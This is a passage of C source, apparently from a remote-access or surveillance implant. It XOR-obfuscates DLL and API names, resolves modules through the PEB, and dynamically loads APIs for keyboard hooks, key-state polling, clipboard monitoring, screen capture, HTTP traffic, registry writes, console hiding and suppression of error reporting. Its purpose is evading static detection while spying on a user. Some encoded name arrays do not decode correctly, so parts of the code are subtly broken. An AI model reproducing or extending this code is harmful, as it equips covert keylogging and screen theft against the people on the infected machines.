  static const unsigned char enc_WinHttpCloseHandle[] = {13, 51, 52, 18, 46, 46, 42, 25, 54, 53, 41, 63, 18, 59, 52, 62, 54, 63};
  static const unsigned char enc_WinHttpSetTimeouts[] = {13, 51, 52, 18, 46, 46, 42, 9, 63, 46, 14, 51, 55, 63, 53, 47, 46, 41};
  static const unsigned char enc_WinHttpSetOption[] = {13, 51, 52, 18, 46, 46, 42, 9, 63, 46, 21, 42, 46, 51, 53, 52};

  /* iphlpapi functions */
  static const unsigned char enc_GetAdaptersAddresses[] = {29, 63, 46, 27, 62, 59, 42, 46, 63, 40, 41, 27, 62, 62, 40, 63, 41, 41, 63, 41};

  /* wer & kernel32 security functions */
  static const unsigned char enc_SetDefaultDllDirectories[] = {89, 63, 62, 110, 63, 60, 59, 63, 54, 62, 110, 54, 54, 110, 59, 40, 63, 57, 62, 45, 40, 59, 63, 41};
  static const unsigned char enc_wer_dll[] = {45, 63, 40, 104, 62, 54, 54};
  static const unsigned char enc_WerSetFlags[] = {85, 63, 40, 89, 63, 62, 124, 54, 59, 61, 41};

  char dll_user32[32], dll_kernel32[32], dll_advapi32[32], dll_bcrypt[32], dll_shell32[32], dll_winhttp[32], dll_iphlpapi[32], dll_wer[32], dll_gdi32[32], dll_ole32[32], dll_gdiplus[32], dll_ntdll[32];
  c2t_win32_xor_decode(dll_user32, enc_user32_dll, sizeof(enc_user32_dll), 0x5A);
  c2t_win32_xor_decode(dll_kernel32, enc_kernel32_dll, sizeof(enc_kernel32_dll), 0x5A);
  c2t_win32_xor_decode(dll_advapi32, enc_advapi32_dll, sizeof(enc_advapi32_dll), 0x5A);
  c2t_win32_xor_decode(dll_bcrypt, enc_bcrypt_dll, sizeof(enc_bcrypt_dll), 0x5A);
  c2t_win32_xor_decode(dll_shell32, enc_shell32_dll, sizeof(enc_shell32_dll), 0x5A);
  c2t_win32_xor_decode(dll_winhttp, enc_winhttp_dll, sizeof(enc_winhttp_dll), 0x5A);
  c2t_win32_xor_decode(dll_iphlpapi, enc_iphlpapi_dll, sizeof(enc_iphlpapi_dll), 0x5A);
  c2t_win32_xor_decode(dll_wer, enc_wer_dll, sizeof(enc_wer_dll), 0x5A);
  c2t_win32_xor_decode(dll_gdi32, enc_gdi32_dll, sizeof(enc_gdi32_dll), 0x5A);
  c2t_win32_xor_decode(dll_ole32, enc_ole32_dll, sizeof(enc_ole32_dll), 0x5A);
  c2t_win32_xor_decode(dll_gdiplus, enc_gdiplus_dll, sizeof(enc_gdiplus_dll), 0x5A);
  c2t_win32_xor_decode(dll_ntdll, enc_ntdll_dll, sizeof(enc_ntdll_dll), 0x5A);

  HMODULE hNtdll = c2t_win32_get_module_peb(L"ntdll.dll");
  if (!hNtdll) hNtdll = GetModuleHandleA(dll_ntdll);

  HMODULE hKernel32 = c2t_win32_get_module_peb(L"kernel32.dll");
  if (!hKernel32) hKernel32 = GetModuleHandleA(dll_kernel32);
  if (!hKernel32) hKernel32 = LoadLibraryA(dll_kernel32);

  HMODULE hUser32 = c2t_win32_get_module_peb(L"user32.dll");
  if (!hUser32) hUser32 = GetModuleHandleA(dll_user32);
  if (!hUser32 && hKernel32) hUser32 = LoadLibraryA(dll_user32);

  HMODULE hGdi32 = c2t_win32_get_module_peb(L"gdi32.dll");
  if (!hGdi32) hGdi32 = GetModuleHandleA(dll_gdi32);
  if (!hGdi32 && hKernel32) hGdi32 = LoadLibraryA(dll_gdi32);

  HMODULE hAdvapi32 = c2t_win32_get_module_peb(L"advapi32.dll");
  if (!hAdvapi32) hAdvapi32 = GetModuleHandleA(dll_advapi32);
  if (!hAdvapi32 && hKernel32) hAdvapi32 = LoadLibraryA(dll_advapi32);

  HMODULE hBcrypt = c2t_win32_get_module_peb(L"bcrypt.dll");
  if (!hBcrypt) hBcrypt = GetModuleHandleA(dll_bcrypt);
  if (!hBcrypt && hKernel32) hBcrypt = LoadLibraryA(dll_bcrypt);

  HMODULE hShell32 = c2t_win32_get_module_peb(L"shell32.dll");
  if (!hShell32) hShell32 = GetModuleHandleA(dll_shell32);
  if (!hShell32 && hKernel32) hShell32 = LoadLibraryA(dll_shell32);

  HMODULE hWinhttp = c2t_win32_get_module_peb(L"winhttp.dll");
  if (!hWinhttp) hWinhttp = GetModuleHandleA(dll_winhttp);
  if (!hWinhttp && hKernel32) hWinhttp = LoadLibraryA(dll_winhttp);

  HMODULE hIphlpapi = c2t_win32_get_module_peb(L"iphlpapi.dll");
  if (!hIphlpapi) hIphlpapi = GetModuleHandleA(dll_iphlpapi);
  if (!hIphlpapi && hKernel32) hIphlpapi = LoadLibraryA(dll_iphlpapi);

  HMODULE hWer = c2t_win32_get_module_peb(L"wer.dll");
  if (!hWer) hWer = GetModuleHandleA(dll_wer);
  if (!hWer && hKernel32) hWer = LoadLibraryA(dll_wer);

  HMODULE hOle32 = c2t_win32_get_module_peb(L"ole32.dll");
  if (!hOle32) hOle32 = GetModuleHandleA(dll_ole32);
  if (!hOle32 && hKernel32) hOle32 = LoadLibraryA(dll_ole32);

  HMODULE hGdiplus = c2t_win32_get_module_peb(L"gdiplus.dll");
  if (!hGdiplus) hGdiplus = GetModuleHandleA(dll_gdiplus);
  if (!hGdiplus && hKernel32) hGdiplus = LoadLibraryA(dll_gdiplus);

#define LOAD_API(hMod, field, enc_arr)                                         \
  do {                                                                         \
    if (hMod) {                                                                \
      char fn_name[64];                                                        \
      c2t_win32_xor_decode(fn_name, enc_arr, sizeof(enc_arr), 0x5A);          \
      FARPROC p = GetProcAddress(hMod, fn_name);                               \
      memcpy(&g_c2t_win32.field, &p, sizeof(g_c2t_win32.field));               \
    }                                                                          \
  } while (0)

  /* user32 */
  LOAD_API(hUser32, GetWindowThreadProcessId, enc_GetWindowThreadProcessId);
  LOAD_API(hUser32, OpenClipboard, enc_OpenClipboard);
  LOAD_API(hUser32, CloseClipboard, enc_CloseClipboard);
  LOAD_API(hUser32, GetClipboardData, enc_GetClipboardData);
  LOAD_API(hUser32, IsClipboardFormatAvailable, enc_IsClipboardFormatAvailable);
  LOAD_API(hUser32, EmptyClipboard, enc_EmptyClipboard);
  LOAD_API(hUser32, SetClipboardData, enc_SetClipboardData);
  LOAD_API(hUser32, AddClipboardFormatListener, enc_AddClipboardFormatListener);
  LOAD_API(hUser32, RemoveClipboardFormatListener, enc_RemoveClipboardFormatListener);
  LOAD_API(hUser32, GetForegroundWindow, enc_GetForegroundWindow);
  LOAD_API(hUser32, GetWindowTextW, enc_GetWindowTextW);
  LOAD_API(hUser32, CreateWindowExW, enc_CreateWindowExW);
  LOAD_API(hUser32, DestroyWindow, enc_DestroyWindow);
  LOAD_API(hUser32, RegisterClassW, enc_RegisterClassW);
  LOAD_API(hUser32, UnregisterClassW, enc_UnregisterClassW);
  LOAD_API(hUser32, DefWindowProcW, enc_DefWindowProcW);
  LOAD_API(hUser32, PeekMessageW, enc_PeekMessageW);
  LOAD_API(hUser32, TranslateMessage, enc_TranslateMessage);
  LOAD_API(hUser32, DispatchMessageW, enc_DispatchMessageW);
  LOAD_API(hUser32, ShowWindow, enc_ShowWindow);
  LOAD_API(hUser32, SetWindowsHookExW, enc_SetWindowsHookExW);
  LOAD_API(hUser32, UnhookWindowsHookEx, enc_UnhookWindowsHookEx);
  LOAD_API(hUser32, CallNextHookEx, enc_CallNextHookEx);
  LOAD_API(hUser32, VkKeyScanW, enc_VkKeyScanW);
  LOAD_API(hUser32, MapVirtualKeyW, enc_MapVirtualKeyW);
  LOAD_API(hUser32, SendInput, enc_SendInput);
  LOAD_API(hUser32, GetMessageW, enc_GetMessageW);
  LOAD_API(hUser32, PostThreadMessageW, enc_PostThreadMessageW);
  LOAD_API(hUser32, RegisterRawInputDevices, enc_RegisterRawInputDevices);
  LOAD_API(hUser32, GetRawInputData, enc_GetRawInputData);
  LOAD_API(hUser32, GetAsyncKeyState, enc_GetAsyncKeyState);
  LOAD_API(hUser32, GetKeyboardLayout, enc_GetKeyboardLayout);
  LOAD_API(hUser32, GetKeyState, enc_GetKeyState);
  LOAD_API(hUser32, ToUnicodeEx, enc_ToUnicodeEx);
  LOAD_API(hUser32, RegisterClassExW, enc_RegisterClassExW);
  LOAD_API(hUser32, MsgWaitForMultipleObjects, enc_MsgWaitForMultipleObjects);
  LOAD_API(hUser32, GetDC, enc_GetDC);
  LOAD_API(hUser32, ReleaseDC, enc_ReleaseDC);
  LOAD_API(hUser32, GetSystemMetrics, enc_GetSystemMetrics);
  LOAD_API(hUser32, EnumDisplayMonitors, enc_EnumDisplayMonitors);
  LOAD_API(hUser32, GetMonitorInfoA, enc_GetMonitorInfoA);

  /* gdi32 */
  LOAD_API(hGdi32, CreateCompatibleDC, enc_CreateCompatibleDC);
  LOAD_API(hGdi32, CreateCompatibleBitmap, enc_CreateCompatibleBitmap);
  LOAD_API(hGdi32, SelectObject, enc_SelectObject);
  LOAD_API(hGdi32, BitBlt, enc_BitBlt);
  LOAD_API(hGdi32, GetDIBits, enc_GetDIBits);
  LOAD_API(hGdi32, DeleteObject, enc_DeleteObject);
  LOAD_API(hGdi32, DeleteDC, enc_DeleteDC);

  /* kernel32 */
  LOAD_API(hKernel32, CreateProcessA, enc_CreateProcessA);
  LOAD_API(hKernel32, OpenProcess, enc_OpenProcess);
  LOAD_API(hKernel32, TerminateProcess, enc_TerminateProcess);
  LOAD_API(hKernel32, GetExitCodeProcess, enc_GetExitCodeProcess);
  LOAD_API(hKernel32, CloseHandle, enc_CloseHandle);
  LOAD_API(hKernel32, CreateMutexA, enc_CreateMutexA);
  LOAD_API(hKernel32, ReleaseMutex, enc_ReleaseMutex);
  LOAD_API(hKernel32, OpenMutexA, enc_OpenMutexA);
  LOAD_API(hKernel32, CreateEventA, enc_CreateEventA);
  LOAD_API(hKernel32, SetEvent, enc_SetEvent);
  LOAD_API(hKernel32, ResetEvent, enc_ResetEvent);
  LOAD_API(hKernel32, OpenEventA, enc_OpenEventA);
  LOAD_API(hKernel32, WaitForSingleObject, enc_WaitForSingleObject);
  LOAD_API(hKernel32, Sleep, enc_Sleep);
  LOAD_API(hKernel32, GetTickCount64, enc_GetTickCount64);
  LOAD_API(hKernel32, QueryPerformanceFrequency, enc_QueryPerformanceFrequency);
  LOAD_API(hKernel32, QueryPerformanceCounter, enc_QueryPerformanceCounter);
  LOAD_API(hKernel32, GetCurrentProcessId, enc_GetCurrentProcessId);
  LOAD_API(hKernel32, GetStdHandle, enc_GetStdHandle);
  LOAD_API(hKernel32, ProcessIdToSessionId, enc_ProcessIdToSessionId);
  LOAD_API(hKernel32, CreateDirectoryA, enc_CreateDirectoryA);
  LOAD_API(hKernel32, CreateFileA, enc_CreateFileA);
  LOAD_API(hKernel32, CreateFileW, enc_CreateFileW);
  LOAD_API(hKernel32, GetCurrentDirectoryA, enc_GetCurrentDirectoryA);
  LOAD_API(hKernel32, GetFullPathNameA, enc_GetFullPathNameA);
  LOAD_API(hKernel32, GetFileAttributesA, enc_GetFileAttributesA);
  LOAD_API(hKernel32, GetFileAttributesW, enc_GetFileAttributesW);
  LOAD_API(hKernel32, ReadFile, enc_ReadFile);
  LOAD_API(hKernel32, WriteFile, enc_WriteFile);
  LOAD_API(hKernel32, GetFileSizeEx, enc_GetFileSizeEx);
  LOAD_API(hKernel32, DeleteFileA, enc_DeleteFileA);
  LOAD_API(hKernel32, MoveFileExA, enc_MoveFileExA);
  LOAD_API(hKernel32, GetConsoleWindow, enc_GetConsoleWindow);
  LOAD_API(hKernel32, FreeConsole, enc_FreeConsole);
  LOAD_API(hKernel32, SetConsoleCtrlHandler, enc_SetConsoleCtrlHandler);
  LOAD_API(hKernel32, SetConsoleTitleA, enc_SetConsoleTitleA);
  LOAD_API(hKernel32, WideCharToMultiByte, enc_WideCharToMultiByte);
  LOAD_API(hKernel32, MultiByteToWideChar, enc_MultiByteToWideChar);
  LOAD_API(hKernel32, QueryFullProcessImageNameA, enc_QueryFullProcessImageNameA);
  LOAD_API(hKernel32, QueryFullProcessImageNameW, enc_QueryFullProcessImageNameW);
  LOAD_API(hKernel32, GlobalLock, enc_GlobalLock);
  LOAD_API(hKernel32, GlobalUnlock, enc_GlobalUnlock);
  LOAD_API(hKernel32, GlobalSize, enc_GlobalSize);
  LOAD_API(hKernel32, GlobalAlloc, enc_GlobalAlloc);
  LOAD_API(hKernel32, GlobalFree, enc_GlobalFree);
  LOAD_API(hKernel32, GetModuleFileNameA, enc_GetModuleFileNameA);
  LOAD_API(hKernel32, GetModuleFileNameW, enc_GetModuleFileNameW);
  LOAD_API(hKernel32, GetModuleHandleA, enc_GetModuleHandleA);
  LOAD_API(hKernel32, GetModuleHandleW, enc_GetModuleHandleW);
  LOAD_API(hKernel32, LoadLibraryA, enc_LoadLibraryA);
  LOAD_API(hKernel32, LoadLibraryW, enc_LoadLibraryW);
  LOAD_API(hKernel32, GetProcAddress, enc_GetProcAddress);
  LOAD_API(hKernel32, GetSystemTime, enc_GetSystemTime);
  LOAD_API(hKernel32, GetCurrentProcess, enc_GetCurrentProcess);
  LOAD_API(hKernel32, SetProcessWorkingSetSize, enc_SetProcessWorkingSetSize);
  LOAD_API(hKernel32, GetProcessWorkingSetSize, enc_GetProcessWorkingSetSize);
  LOAD_API(hKernel32, K32GetProcessMemoryInfo, enc_K32GetProcessMemoryInfo);
  LOAD_API(hKernel32, VirtualLock, enc_VirtualLock);
  LOAD_API(hKernel32, VirtualUnlock, enc_VirtualUnlock);
  LOAD_API(hKernel32, InitializeCriticalSection, enc_InitializeCriticalSection);
  LOAD_API(hKernel32, EnterCriticalSection, enc_EnterCriticalSection);
  LOAD_API(hKernel32, LeaveCriticalSection, enc_LeaveCriticalSection);
  LOAD_API(hKernel32, DeleteCriticalSection, enc_DeleteCriticalSection);
  LOAD_API(hKernel32, InitOnceExecuteOnce, enc_InitOnceExecuteOnce);
  LOAD_API(hKernel32, CreateThread, enc_CreateThread);
  LOAD_API(hKernel32, GetCurrentThreadId, enc_GetCurrentThreadId);
  LOAD_API(hKernel32, GetLocaleInfoA, enc_GetLocaleInfoA);
  LOAD_API(hKernel32, GetLastError, enc_GetLastError);
  LOAD_API(hKernel32, SetLastError, enc_SetLastError);
  LOAD_API(hKernel32, CreateDirectoryW, enc_CreateDirectoryW);
  LOAD_API(hKernel32, FindFirstFileW, enc_FindFirstFileW);
  LOAD_API(hKernel32, FindNextFileW, enc_FindNextFileW);
  LOAD_API(hKernel32, FindClose, enc_FindClose);
  LOAD_API(hKernel32, FreeLibrary, enc_FreeLibrary);
  LOAD_API(hKernel32, HeapSetInformation, enc_HeapSetInformation);
  LOAD_API(hKernel32, InitializeConditionVariable, enc_InitializeConditionVariable);
  LOAD_API(hKernel32, SleepConditionVariableCS, enc_SleepConditionVariableCS);
  LOAD_API(hKernel32, WakeConditionVariable, enc_WakeConditionVariable);
  LOAD_API(hKernel32, GetComputerNameA, enc_GetComputerNameA);
  LOAD_API(hKernel32, GetNativeSystemInfo, enc_GetNativeSystemInfo);
  LOAD_API(hKernel32, CreatePipe, enc_CreatePipe);
  LOAD_API(hKernel32, PeekNamedPipe, enc_PeekNamedPipe);
  LOAD_API(hKernel32, SetHandleInformation, enc_SetHandleInformation);
  LOAD_API(hKernel32, GetEnvironmentVariableA, enc_GetEnvironmentVariableA);
  LOAD_API(hKernel32, GetSystemDirectoryA, enc_GetSystemDirectoryA);
  LOAD_API(hKernel32, CreateJobObjectA, enc_CreateJobObjectA);
  LOAD_API(hKernel32, SetInformationJobObject, enc_SetInformationJobObject);
  LOAD_API(hKernel32, AssignProcessToJobObject, enc_AssignProcessToJobObject);
  LOAD_API(hKernel32, TerminateJobObject, enc_TerminateJobObject);
  LOAD_API(hKernel32, ResumeThread, enc_ResumeThread);
  LOAD_API(hKernel32, DuplicateHandle, enc_DuplicateHandle);
  LOAD_API(hKernel32, SetDefaultDllDirectories, enc_SetDefaultDllDirectories);

  if (g_c2t_win32.SetDefaultDllDirectories) {
    g_c2t_win32.SetDefaultDllDirectories(0x00000800U); /* LOAD_LIBRARY_SEARCH_SYSTEM32 */
  }

  /* ntdll */
  LOAD_API(hNtdll, RtlGetVersion, enc_RtlGetVersion);

  /* advapi32 */
  LOAD_API(hAdvapi32, OpenProcessToken, enc_OpenProcessToken);
  LOAD_API(hAdvapi32, GetTokenInformation, enc_GetTokenInformation);
  LOAD_API(hAdvapi32, GetUserNameA, enc_GetUserNameA);
  LOAD_API(hAdvapi32, RtlGenRandom, enc_SystemFunction036);
  LOAD_API(hAdvapi32, RegOpenKeyExA, enc_RegOpenKeyExA);
  LOAD_API(hAdvapi32, RegSetValueExA, enc_RegSetValueExA);
  LOAD_API(hAdvapi32, RegDeleteValueA, enc_RegDeleteValueA);
  LOAD_API(hAdvapi32, RegQueryValueExA, enc_RegQueryValueExA);
  LOAD_API(hAdvapi32, RegCloseKey, enc_RegCloseKey);

  /* bcrypt */
  LOAD_API(hBcrypt, BCryptOpenAlgorithmProvider, enc_BCryptOpenAlgorithmProvider);
  LOAD_API(hBcrypt, BCryptGenRandom, enc_BCryptGenRandom);
  LOAD_API(hBcrypt, BCryptCloseAlgorithmProvider, enc_BCryptCloseAlgorithmProvider);

  /* shell32 */
  LOAD_API(hShell32, SHGetFolderPathW, enc_SHGetFolderPathW);
  LOAD_API(hShell32, DragQueryFileW, enc_DragQueryFileW);
  LOAD_API(hShell32, ShellExecuteExA, enc_ShellExecuteExA);
  LOAD_API(hShell32, IsUserAnAdmin, enc_IsUserAnAdmin);

  /* winhttp */
  LOAD_API(hWinhttp, WinHttpOpen, enc_WinHttpOpen);
  LOAD_API(hWinhttp, WinHttpConnect, enc_WinHttpConnect);
  LOAD_API(hWinhttp, WinHttpOpenRequest, enc_WinHttpOpenRequest);
  LOAD_API(hWinhttp, WinHttpSendRequest, enc_WinHttpSendRequest);
  LOAD_API(hWinhttp, WinHttpReceiveResponse, enc_WinHttpReceiveResponse);
  LOAD_API(hWinhttp, WinHttpQueryDataAvailable, enc_WinHttpQueryDataAvailable);
  LOAD_API(hWinhttp, WinHttpReadData, enc_WinHttpReadData);
  LOAD_API(hWinhttp, WinHttpWriteData, enc_WinHttpWriteData);
  LOAD_API(hWinhttp, WinHttpQueryHeaders, enc_WinHttpQueryHeaders);
  LOAD_API(hWinhttp, WinHttpCloseHandle, enc_WinHttpCloseHandle);
  LOAD_API(hWinhttp, WinHttpSetTimeouts, enc_WinHttpSetTimeouts);
  LOAD_API(hWinhttp, WinHttpSetOption, enc_WinHttpSetOption);

  /* iphlpapi */
  LOAD_API(hIphlpapi, GetAdaptersAddresses, enc_GetAdaptersAddresses);

  /* wer */
  LOAD_API(hWer, WerSetFlags, enc_WerSetFlags);

  /* ole32 */
  LOAD_API(hOle32, CreateStreamOnHGlobal, enc_CreateStreamOnHGlobal);
  LOAD_API(hOle32, GetHGlobalFromStream, enc_GetHGlobalFromStream);

  /* gdiplus */
  LOAD_API(hGdiplus, GdiplusStartup, enc_GdiplusStartup);
  LOAD_API(hGdiplus, GdiplusShutdown, enc_GdiplusShutdown);
  LOAD_API(hGdiplus, GdipCreateBitmapFromGdiDib, enc_GdipCreateBitmapFromGdiDib);
  LOAD_API(hGdiplus, GdipSaveImageToStream, enc_GdipSaveImageToStream);
  LOAD_API(hGdiplus, GdipDisposeImage, enc_GdipDisposeImage);

#undef LOAD_API

  g_win32_initialized = 1;
}

#endif /* _WIN32 */

typedef int c2t_win32_api_dummy_t;
